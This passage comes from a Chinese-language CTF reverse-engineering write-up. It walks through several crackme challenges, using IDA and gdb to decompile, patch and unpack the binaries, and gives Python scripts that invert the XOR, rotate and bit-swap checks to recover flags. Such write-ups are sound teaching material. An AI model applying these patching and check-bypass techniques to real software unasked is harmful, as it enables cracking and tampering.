class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>還原</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> enrypted_flag[] = <span class="string">&quot;\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        enrypted_flag[i] ^= <span class="number">0xF5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(<span class="built_in">strlen</span>(enrypted_flag));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, enrypted_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B19KH0EJlg.png" alt="image"></p>
<h4 id="time-GEM"><a href="#time-GEM" class="headerlink" title="time_GEM"></a>time_GEM</h4><p><img src="https://hackmd.io/_uploads/Hy1iXhjJgl.png" alt="image"><br><img src="https://hackmd.io/_uploads/HJH4wR4Jxl.png" alt="image"><br><img src="https://hackmd.io/_uploads/ryxXy2oJxg.png" alt="image"><br>進 power，F5<br><img src="https://hackmd.io/_uploads/S1rYyhoJgx.png" alt="image"><br>把 sleep 秒數 patch 成 0<br><img src="https://hackmd.io/_uploads/BkZ0JhjJge.png" alt="image"><br><img src="https://hackmd.io/_uploads/Hypzg3sJex.png" alt="image"><br>apply patch<br><img src="https://hackmd.io/_uploads/SJlvx3sJll.png" alt="image"><br>執行 patch 後的<br><img src="https://hackmd.io/_uploads/S1Ypl2oygx.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyoJZhjJgx.png" alt="image"></p>
<h4 id="Python-Hunter-🐍"><a href="#Python-Hunter-🐍" class="headerlink" title="Python Hunter 🐍"></a>Python Hunter 🐍</h4><p><img src="https://hackmd.io/_uploads/Hk2R72i1gx.png" alt="image"><br>把 hunter.cpython-38.pyc 放到 <a target="_blank" rel="noopener" href="https://pylingual.io/">https://pylingual.io/</a> 轉 py<br><img src="https://hackmd.io/_uploads/rkmtE2jkxe.png" alt="image"><br>hunter.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys <span class="keyword">as</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qwe</span>(<span class="params">abc, xyz</span>):</span><br><span class="line">    r = []</span><br><span class="line">    l = <span class="built_in">len</span>(xyz)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(abc)):</span><br><span class="line">        t = <span class="built_in">chr</span>(abc[i] ^ <span class="built_in">ord</span>(xyz[i % l]))</span><br><span class="line">        r.append(t)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line">d = [<span class="number">48</span>, <span class="number">39</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">16</span>, <span class="number">82</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">13</span>, <span class="number">92</span>, <span class="number">71</span>, <span class="number">104</span>, <span class="number">52</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">7</span>, <span class="number">95</span>, <span class="number">28</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">78</span>, <span class="number">87</span>, <span class="number">29</span>, <span class="number">18</span>]</span><br><span class="line">k = <span class="string">&#x27;door_key&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;not_a_key&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asd</span>(<span class="params">p</span>):</span><br><span class="line">    u = <span class="number">42</span></span><br><span class="line">    v = qwe(d, k)</span><br><span class="line">    w = qwe(d, p)</span><br><span class="line">    <span class="keyword">if</span> w == v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Correct! <span class="subst">&#123;v&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dummy</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(d) * <span class="number">2</span> - <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        asd(s.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Please provide a key as an argument.&#x27;</span>)</span><br><span class="line">    dummy()</span><br></pre></td></tr></table></figure>
<p>直接執行說需要參數 key<br><img src="https://hackmd.io/_uploads/SyrUB2i1ge.png" alt="image"></p>
<h4 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h4><p><img src="https://hackmd.io/_uploads/rJ2DUns1ex.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkCm_3i1ex.png" alt="image"><br>進 main，F5<br><img src="https://hackmd.io/_uploads/BJmMd2oylg.png" alt="image"><br>先把每個輸入字元做一個循環左位移（ROL）和右位移（ROR）混合，然後再 XOR 0xF<br>然後要讓 sub_11C9(s) return 1<br><img src="https://hackmd.io/_uploads/Hkb_u3iyle.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkQL52oyll.png" alt="image"><br>三個三個一組，用 dword_4020 求出 a1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a[i]   + a[i+1] = d[i]</span><br><span class="line">a[i+1] + a[i+2] = d[i+1]</span><br><span class="line">a[i]   + a[i+2] = d[i+2]</span><br><span class="line">a0+a1+a2 = (d0+d1+d2)/2 = sum</span><br><span class="line">a0 = sum-d1 = (d0-d1+d2)/2</span><br></pre></td></tr></table></figure>
<p>求出可以讓 sub_11C9(s) return 1 的 a1 後再回推位移<br>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ROR</span>(<span class="params">val, rbits</span>):</span><br><span class="line">    <span class="keyword">return</span> ((val &gt;&gt; rbits) | (val &lt;&lt; (<span class="number">8</span> - rbits))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dword_4020 資料（共 33 個值）</span></span><br><span class="line">dword_4020 = [</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0xC5</span>, <span class="number">0x81</span>, <span class="number">0x50</span>, <span class="number">0x9B</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0xA5</span>,</span><br><span class="line">    <span class="number">0xB5</span>, <span class="number">0x100</span>, <span class="number">0xD1</span>, <span class="number">0x171</span>, <span class="number">0x1C1</span>, <span class="number">0x160</span>, <span class="number">0x13B</span>, <span class="number">0x163</span>,</span><br><span class="line">    <span class="number">0x1A2</span>, <span class="number">0xF7</span>, <span class="number">0x167</span>, <span class="number">0x184</span>, <span class="number">0x155</span>, <span class="number">0x174</span>, <span class="number">0x121</span>, <span class="number">0xD1</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x80</span>, <span class="number">0x181</span>, <span class="number">0x174</span>, <span class="number">0x1DD</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x50</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">33</span>, <span class="number">3</span>):</span><br><span class="line">    d0 = dword_4020[i]</span><br><span class="line">    d1 = dword_4020[i+<span class="number">1</span>]</span><br><span class="line">    d2 = dword_4020[i+<span class="number">2</span>]</span><br><span class="line">    </span><br><span class="line">    a = (d0 - d1 + d2) // <span class="number">2</span></span><br><span class="line">    b = d0 - a</span><br><span class="line">    c = d1 - b</span><br><span class="line"></span><br><span class="line">    x.extend([a, b, c])</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    decrypted = ROR(x[i] ^ <span class="number">0xF</span>, i &amp; <span class="number">7</span>)</span><br><span class="line">    s += <span class="built_in">chr</span>(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, s)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/Hyyia2syxl.png" alt="image"></p>
<h4 id="Noo-dle"><a href="#Noo-dle" class="headerlink" title="Noo dle"></a>Noo dle</h4><p><img src="https://hackmd.io/_uploads/SkAkA2skge.png" alt="image"><br>chal<br>main，F5<br><img src="https://hackmd.io/_uploads/BkgPWpjkgx.png" alt="image"><br>要從output回推輸入(flag)<br>(變數重新命名後)<br><img src="https://hackmd.io/_uploads/rklJ4Tj1ex.png" alt="image"><br><code>(__int64)&amp;len8 + 4</code> &#x3D; <code>v8[12]</code><br>encrypt() 會把輸入 expand 再 swap 再 compress<br><img src="https://hackmd.io/_uploads/rkSnzToklx.png" alt="image"><br>把輸入每一 byte 的 8 bit 都展開放在 8 bytes<br><img src="https://hackmd.io/_uploads/S1zTf6s1lx.png" alt="image"><br>把每個展開的 8 bit 壓縮回 1 byte<br><img src="https://hackmd.io/_uploads/BkAAW6oyle.png" alt="image"><br>把加密結果(bytes)轉 hex str 而已</p>
<p>所以，把輸出轉 bytes 然後逐步推回輸入</p>
<p>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># output.txt</span></span><br><span class="line">cipher_hex = <span class="string">&quot;2a48589898decafcaefa98087cfa58ae9e2afa1c1aaa2e96fa38061a9ca8fa182ebeee&quot;</span> </span><br><span class="line"></span><br><span class="line">cipher_bytes = <span class="built_in">bytearray</span>(unhexlify(cipher_hex))</span><br><span class="line">cipher_bits = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 解壓縮 (把每個 byte 拆成 8 個 bits)</span></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> cipher_bytes:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        bit = (byte &gt;&gt; (<span class="number">7</span> - i)) &amp; <span class="number">1</span></span><br><span class="line">        cipher_bits.append(bit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 對每 8 個 bit 解 swap（inverse permutation）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_swap</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">7</span> &gt;= <span class="built_in">len</span>(bits):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        bits[i + <span class="number">0</span>], bits[i + <span class="number">7</span>] = bits[i + <span class="number">7</span>], bits[i + <span class="number">0</span>]</span><br><span class="line">        bits[i + <span class="number">1</span>], bits[i + <span class="number">4</span>] = bits[i + <span class="number">4</span>], bits[i + <span class="number">1</span>]</span><br><span class="line">        bits[i + <span class="number">2</span>], bits[i + <span class="number">5</span>] = bits[i + <span class="number">5</span>], bits[i + <span class="number">2</span>]</span><br><span class="line">        bits[i + <span class="number">3</span>], bits[i + <span class="number">6</span>] = bits[i + <span class="number">6</span>], bits[i + <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line">swapped_bits = reverse_swap(cipher_bits)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 將 bits 組成 bytes</span></span><br><span class="line">plain_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(swapped_bits), <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> i + j &lt; <span class="built_in">len</span>(swapped_bits):</span><br><span class="line">            byte |= (swapped_bits[i + j] &lt;&lt; (<span class="number">7</span> - j))</span><br><span class="line">    plain_bytes.append(byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_bytes)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJzEvai1le.png" alt="image"></p>
<h4 id="Empty"><a href="#Empty" class="headerlink" title="Empty"></a>Empty</h4><p><img src="https://hackmd.io/_uploads/BJzPwpokgl.png" alt="image"><br><img src="https://hackmd.io/_uploads/SkV8dTokeg.png" alt="image"><br>入口點像在脫殼，因為不斷對 sub_1060() XOR<br><img src="https://hackmd.io/_uploads/BkguuTokxg.png" alt="image"><br>sub_1060() 脫殼前都是空的</p>
<p>開 gdb 在脫殼後下斷點，就可以看到脫殼後的 sub_1060()<br>先記錄幾個 offset<br><img src="https://hackmd.io/_uploads/SyfAcTi1xx.png" alt="image"><br>0x110a &#x3D;&gt; start()<br>0x11e9 &#x3D;&gt; 脫殼完<br>0x1060 &#x3D;&gt; sub1060()<br>用 vmamp 取得基址<br><img src="https://hackmd.io/_uploads/BJRBsTi1gg.png" alt="image"><br>確認脫殼前 sub_1060() 都是 nop<br><img src="https://hackmd.io/_uploads/HkCijpi1gg.png" alt="image"><br>按 c 到脫殼完，可以看到 sub_1060() 正常了<br><img src="https://hackmd.io/_uploads/rJMzhpsJxg.png" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/100i 0x555555555060</span><br><span class="line">=&gt; 0x555555555060:      endbr64</span><br><span class="line">   0x555555555064:      push   rbp</span><br><span class="line">   0x555555555065:      mov    rbp,rsp</span><br><span class="line">   0x555555555068:      sub    rsp,0x30</span><br><span class="line">   0x55555555506c:      mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x555555555075:      mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x555555555079:      xor    eax,eax</span><br><span class="line">   0x55555555507b:      mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">   0x555555555083:      mov    QWORD PTR [rbp-0x18],0x0</span><br><span class="line">   0x55555555508b:      mov    BYTE PTR [rbp-0x10],0x0</span><br><span class="line">   0x55555555508f:      lea    rax,[rip+0xf6a]        # 0x555555556000</span><br><span class="line">   0x555555555096:      mov    rdi,rax</span><br><span class="line">   0x555555555099:      mov    eax,0x0</span><br><span class="line">   0x55555555509e:      call   0x555555555030 &lt;printf@plt&gt;</span><br><span class="line">   0x5555555550a3:      lea    rax,[rbp-0x20]</span><br><span class="line">   0x5555555550a7:      mov    rsi,rax</span><br><span class="line">   0x5555555550aa:      lea    rax,[rip+0xf5b]        # 0x55555555600c</span><br><span class="line">   0x5555555550b1:      mov    rdi,rax</span><br><span class="line">   0x5555555550b4:      mov    eax,0x0</span><br><span class="line">   0x5555555550b9:      call   0x555555555040 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x5555555550be:      mov    DWORD PTR [rbp-0x28],0x0</span><br><span class="line">   0x5555555550c5:      jmp    0x555555555107</span><br><span class="line">   0x5555555550c7:      mov    eax,DWORD PTR [rbp-0x28]</span><br><span class="line">   0x5555555550ca:      cdqe</span><br><span class="line">   0x5555555550cc:      movzx  eax,BYTE PTR [rbp+rax*1-0x20]</span><br><span class="line">   0x5555555550d1:      xor    eax,0xffffffab</span><br><span class="line">   0x5555555550d4:      mov    ecx,eax</span><br><span class="line">   0x5555555550d6:      mov    eax,DWORD PTR [rbp-0x28]</span><br><span class="line">   0x5555555550d9:      cdqe</span><br><span class="line">   0x5555555550db:      lea    rdx,[rip+0x2f1e]        # 0x555555558000</span><br><span class="line">   0x5555555550e2:      movzx  eax,BYTE PTR [rax+rdx*1]</span><br><span class="line">   0x5555555550e6:      cmp    cl,al</span><br><span class="line">   0x5555555550e8:      je     0x555555555103</span><br><span class="line">   0x5555555550ea:      lea    rax,[rip+0xf20]        # 0x555555556011</span><br><span class="line">   0x5555555550f1:      mov    rdi,rax</span><br><span class="line">   0x5555555550f4:      call   0x555555555010 &lt;puts@plt&gt;</span><br><span class="line">   0x5555555550f9:      mov    edi,0x0</span><br><span class="line">   0x5555555550fe:      call   0x555555555050 &lt;exit@plt&gt;</span><br><span class="line">   0x555555555103:      add    DWORD PTR [rbp-0x28],0x1</span><br><span class="line">   0x555555555107:      cmp    DWORD PTR [rbp-0x28],0xf</span><br><span class="line">   0x55555555510b:      jle    0x5555555550c7</span><br><span class="line">   0x55555555510d:      lea    rax,[rip+0xf04]        # 0x555555556018</span><br><span class="line">   0x555555555114:      mov    rdi,rax</span><br><span class="line">   0x555555555117:      call   0x555555555010 &lt;puts@plt&gt;</span><br><span class="line">   0x55555555511c:      mov    DWORD PTR [rbp-0x24],0x0</span><br><span class="line">   0x555555555123:      jmp    0x55555555515f</span><br><span class="line">   0x555555555125:      mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">   0x555555555128:      cdqe</span><br><span class="line">   0x55555555512a:      lea    rdx,[rip+0x2eef]        # 0x555555558020</span><br><span class="line">   0x555555555131:      movzx  ecx,BYTE PTR [rax+rdx*1]</span><br><span class="line">   0x555555555135:      mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">   0x555555555138:      cdq</span><br><span class="line">   0x555555555139:      shr    edx,0x1c</span><br><span class="line">   0x55555555513c:      add    eax,edx</span><br><span class="line">   0x55555555513e:      and    eax,0xf</span><br><span class="line">   0x555555555141:      sub    eax,edx</span><br><span class="line">   0x555555555143:      cdqe</span><br><span class="line">   0x555555555145:      movzx  eax,BYTE PTR [rbp+rax*1-0x20]</span><br><span class="line">   0x55555555514a:      xor    ecx,eax</span><br><span class="line">   0x55555555514c:      mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">   0x55555555514f:      cdqe</span><br><span class="line">   0x555555555151:      lea    rdx,[rip+0x2ec8]        # 0x555555558020</span><br><span class="line">   0x555555555158:      mov    BYTE PTR [rax+rdx*1],cl</span><br><span class="line">   0x55555555515b:      add    DWORD PTR [rbp-0x24],0x1</span><br><span class="line">   0x55555555515f:      mov    eax,DWORD PTR [rbp-0x24]</span><br><span class="line">   0x555555555162:      cmp    eax,0x24</span><br><span class="line">   0x555555555165:      jbe    0x555555555125</span><br><span class="line">   0x555555555167:      lea    rax,[rip+0x2eb2]        # 0x555555558020</span><br><span class="line">   0x55555555516e:      mov    rsi,rax</span><br><span class="line">   0x555555555171:      lea    rax,[rip+0xea9]        # 0x555555556021</span><br><span class="line">   0x555555555178:      mov    rdi,rax</span><br><span class="line">   0x55555555517b:      mov    eax,0x0</span><br><span class="line">   0x555555555180:      call   0x555555555030 &lt;printf@plt&gt;</span><br><span class="line">   0x555555555185:      mov    eax,0x0</span><br><span class="line">   0x55555555518a:      mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x55555555518e:      sub    rdx,QWORD PTR fs:0x28</span><br><span class="line">   0x555555555197:      je     0x55555555519e</span><br><span class="line">   0x555555555199:      call   0x555555555020 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x55555555519e:      leave</span><br><span class="line">   0x55555555519f:      ret</span><br><span class="line">   0x5555555551a0:      lea    rsi,[rip+0xfffffffffffffeb9]        # 0x555555555060</span><br><span class="line">   0x5555555551a7:      mov    rdi,rsi</span><br><span class="line">   0x5555555551aa:      and    rdi,0xfffffffffffff000</span><br><span class="line">   0x5555555551b1:      mov    rsi,0x1000</span><br><span class="line">   0x5555555551b8:      mov    rdx,0x7</span><br><span class="line">   0x5555555551bf:      mov    rax,0xa</span><br><span class="line">   0x5555555551c6:      syscall</span><br><span class="line">   0x5555555551c8:      lea    rsi,[rip+0xfffffffffffffe91]        # 0x555555555060</span><br><span class="line">   0x5555555551cf:      mov    rcx,0x13e</span><br><span class="line">   0x5555555551d6:      lea    rdi,[rip+0x2e68]        # 0x555555558045</span><br><span class="line">   0x5555555551dd:      mov    al,BYTE PTR [rdi]</span><br><span class="line">   0x5555555551df:      xor    BYTE PTR [rsi],al</span><br><span class="line">   0x5555555551e1:      inc    rsi</span><br><span class="line">   0x5555555551e4:      inc    rdi</span><br><span class="line">   0x5555555551e7:      loop   0x5555555551dd</span><br><span class="line">   0x5555555551e9:      call   0x555555555060</span><br><span class="line">   0x5555555551ee:      mov    rax,0x3c</span><br><span class="line">   0x5555555551f5:      xor    rdi,rdi</span><br><span class="line">   0x5555555551f8:      syscall</span><br><span class="line">   0x5555555551fa:      add    BYTE PTR [rax],al</span><br></pre></td></tr></table></figure>
<p>分析 sub_1060()<br>看存取的位置是什麼data<br><img src="https://hackmd.io/_uploads/BJ4ZXRs1eg.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1fCNAiyeg.png" alt="image"><br>把此時的記憶體dump下來<br><img src="https://hackmd.io/_uploads/H1MwSCsJxe.png" alt="image"><br>empty_dump 雖然不是正確ELF格式，但還是可以丟ida<br><img src="https://hackmd.io/_uploads/rkm4IAskle.png" alt="image"><br><img src="https://hackmd.io/_uploads/Byts80jkgg.png" alt="image"><br>offset 0x4000 對應到 0x555555558000，在剛剛的gdb中，這些在執行 sub_1060() 時已經被改成亂碼</p>
<p>根據反編譯的結果，只要輸入正確密碼，就會算出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset4000 = [<span class="number">0xea</span>,<span class="number">0xc0</span>,<span class="number">0xc2</span>,<span class="number">0xd1</span>,<span class="number">0xde</span>,<span class="number">0xc0</span>,<span class="number">0xc2</span>,<span class="number">0xe0</span>,<span class="number">0xca</span>,<span class="number">0xc5</span>,<span class="number">0xc5</span>,<span class="number">0xca</span>,<span class="number">0x9a</span>,<span class="number">0x9b</span>,<span class="number">0x9e</span>,<span class="number">0x9b</span>]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x ^ <span class="number">0xab</span>) <span class="keyword">for</span> x <span class="keyword">in</span> offset4000])</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
<p><code>AkizukiKanna1050</code><br><img src="https://hackmd.io/_uploads/S12jdCsyll.png" alt="image"></p>
<h4 id="Demon-Summoning"><a href="#Demon-Summoning" class="headerlink" title="Demon Summoning"></a>Demon Summoning</h4><p><img src="https://hackmd.io/_uploads/SkPCO0i1gl.png" alt="image"><br>Ancient_Parchment 打開都是亂碼<br>chal.exe 直接執行<br><img src="https://hackmd.io/_uploads/S1SNa0jkeg.png" alt="image"><br>然後再按一下就關閉</p>
